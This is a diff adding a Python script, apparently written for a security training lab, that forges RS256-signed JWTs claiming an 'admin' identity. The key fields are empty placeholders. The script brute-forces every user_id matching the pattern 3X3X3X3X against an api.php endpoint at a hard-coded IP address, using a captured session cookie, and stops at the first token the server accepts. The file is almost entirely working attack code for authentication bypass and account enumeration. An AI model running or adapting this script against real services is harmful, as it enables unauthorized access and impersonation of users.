@@ -1,0 +1,74 @@
+import jwt
+import time
+import requests
+from itertools import product
+
+
+private_key = """-----BEGIN RSA PRIVATE KEY-----
+
+-----END RSA PRIVATE KEY-----
+"""
+
+public_key = """
+-----BEGIN PUBLIC KEY-----
+-----END PUBLIC KEY-----
+"""
+
+
+def create_jwt(user_id):
+    payload = {
+        "iss": "https://www.itsafe.co.il/",
+        "iat": int(time.time()),
+        "exp": int(time.time()) + 600,
+        "data": {
+            "name": "admin",
+            "email": "",
+            "user_id": user_id,
+            "phone": ""
+        }
+    }
+    token = jwt.encode(payload, private_key, algorithm="RS256")
+    return token
+
+
+def generate_user_ids(pattern):
+    for digits in product('0123456789', repeat=4):
+        yield pattern.replace('X', '{}').format(*digits)
+
+
+def check_token(token):
+    url = "http://18.158.46.251:31256/api.php"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Authorization": f"JWT {token}",
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": "http://18.158.46.251:31256",
+        "Connection": "close",
+        "Referer": "http://18.158.46.251:31256/main_page.html",
+        "Cookie": "PHPSESSID=ugkuv989o72ngbh1ubs5i5nv73"
+    }
+    data = {
+        "action": "auth"
+    }
+
+    response = requests.post(url, headers=headers, data=data)
+    return response.status_code, response.json()
+
+# Пример брутфорса значения user_id
+pattern = "3X3X3X3X"
+for user_id in generate_user_ids(pattern):
+    token = create_jwt(user_id)
+    status_code, response_json = check_token(token)
+
+    print(f"Trying user_id {user_id} - Status code: {status_code}")
+
+    if response_json.get("success") == True:
+        print(f"Valid token found for user_id {user_id}: {token}")
+        print(f"Response: {response_json}")
+        break
+    else:
+        print(f"Invalid token for user_id {user_id}")
